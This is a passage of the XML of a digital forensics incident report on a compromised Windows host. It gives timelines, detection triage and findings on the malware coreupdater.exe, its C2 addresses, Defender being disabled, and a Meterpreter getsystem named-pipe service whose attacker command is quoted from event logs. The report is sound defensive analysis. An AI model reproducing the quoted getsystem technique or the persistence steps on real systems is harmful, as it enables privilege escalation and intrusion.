            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:59.765675</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: portable devices (WPD)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Portable device: key written</w:t>
              <w:br/>
              <w:t>Incident_drive DISK&amp;VEN_SANDISK&amp;PROD_CRUZER_GLIDE_3.0&amp;REV_1.00 serial=4C530000261130109435&amp;0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_WindowsPortableDevices.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.344277</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USB: last connected</w:t>
              <w:br/>
              <w:t xml:space="preserve">USB Mass Storage Device serial=4C530000261130109435 Cruzer Glide 3.0 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_USB.csv#4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56.191578</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>FTK IMAGER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=E67CC266 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#54</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\FTK IMAGER.EXE-E67CC266.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56.191578</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>e:\ftk imager\ftk imager.exe</w:t>
              <w:br/>
              <w:t>FTK Imager.exe SHA1=32756b3a319340c4b7fead410d3f36e503b30da2 accessdata® ftk® imager 4.2.1.4 compiled=2018-04-02 18:04:48.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.224593</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C137\ricksanchez | LogonType 11 | LogonId: 0xB3CE02 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39826</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:13.183384</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>MSINFO32.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=C3C668DA False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\MSINFO32.EXE-C3C668DA.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:09.150531</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>SNIPPINGTOOL.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=B23F9DB3 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#141</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\SNIPPINGTOOL.EXE-B23F9DB3.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Triage of automatic detections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Triage of Hayabusa/Chainsaw/Zircolite/Suricata detections. True positives: F-006 RDP type 10 logon of C137\Administrator (SID -500) from DC 10.42.85.10, 03:36:24-03:52:13; F-007 Defender RTP/MAPS/sample submission disabled 03:39:45-03:39:49 (5001/5007 + DisableRealtimeMonitoring=1); F-008 coreupdater.exe (SHA256 10f3b920..., SHA1 fd153c66...) downloaded via Edge from 194.61.24.102 03:39:57, moved to System32, executed 03:40:49 (Prefetch, psscan PID 8324), service 'coreupdater' 7045 03:42:42, C2 203.78.103.109:443 (Suricata Metasploit Bind_API, netscan ESTABLISHED); F-009 getsystem service 'nehgye' 03:43:14 (7045 + CMD prefetch); F-010 Run key 'coreupdate' fired 05:08:37-05:08:44, hidden PowerShell reflective shellcode loader from HKLM\Software\q9Z1bssi (4104/600, prefetch, psscan PID 508-&gt;3316, new C2 flow); F-011 network context: 194.61.24.102 RDP to DC and DC fetched coreupdater, pcap clock ≈ host UTC −1 h (validated on 3 pivots). 7 IOCs, 7 timeline events. FPs documented in note (VMware drivers, FTK ad_driver.sys, OOBE/domain-join account events, SCM WMI consumer, MSIX).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-009: Privilege escalation: Meterpreter getsystem named-pipe impersonation service "nehgye"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evtx:system.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>privilege escalation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1134.001, T1543.003, T1569.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740 → 2020-09-19 03:43:15.054907</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>System EID 7045 RecordID 959 at 2020-09-19 03:43:14.991 UTC: service 'nehgye', ImagePath 'cmd.exe /c echo nehgye &gt; \\.\pipe\nehgye', demand start, LocalSystem, user mode service; System EID 7009 RecordID 960 at 03:43:15.055 (service start timeout, expected as cmd.exe is not a service binary). Prefetch CMD.EXE-BD30981.pf PreviousRun0 = 03:43:14.9908796 (exact match). coreupdater.exe (PID 8324) exits at 03:43:10 per memory psscan. Detections: Chainsaw critical 'Meterpreter or Cobalt Strike Getsystem Service Installation', Hayabusa/Zircolite/Chainsaw high '... - System', 'Uncommon Service Installation Image Path', 'Suspicious Commands Service Installation'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive. Random 6-letter service name echoing into an identically named pipe is the signature of Metasploit 'getsystem' technique 1 (named pipe impersonation) to obtain NT AUTHORITY\SYSTEM from the Meterpreter session established by coreupdater.exe (migrated, since coreupdater exits at 03:43:10 while the C2 flow continues). Followed at 03:44:03 by the SYSTEM-level HKLM Run key 'coreupdate' persistence (lead from step 1).</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03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: nehgye | StartType: demand start | Account: LocalSystem | cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40867</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:15.054907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 7009 | Service Control Manager</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40868</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>CMD.EXE</w:t>
              <w:br/>
              <w:t>runs=9 hash=BD30981 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\CMD.EXE-0BD30981.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>critical</w:t>
              <w:br/>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation | {"ServiceName":"nehgye","ImagePath":"cmd.exe /c echo nehgye &gt; \\\\.\\pipe\\nehgye","StartType":"demand start","AccountName":"LocalSystem","ServiceType":"user mode service"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#103</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>high</w:t>
              <w:br/>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation - System | {"Svc":"nehgye","Path":"cmd.exe /c echo nehgye &gt; \\\\.\\pipe\\nehgye","Acct":"LocalSystem","StartType":"demand start"} | {"ServiceType":"user mode service"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1342</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-008: Malware coreupdater.exe downloaded from 194.61.24.102 via Edge, moved to C:\Windows\System32, executed and installed as auto-start service "coreupdater"</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artifact:amcache (files)</w:t>
              <w:br/>
              <w:t>artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>execution / persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1543.003, T1036.005, T1071.001, T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571 → 2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
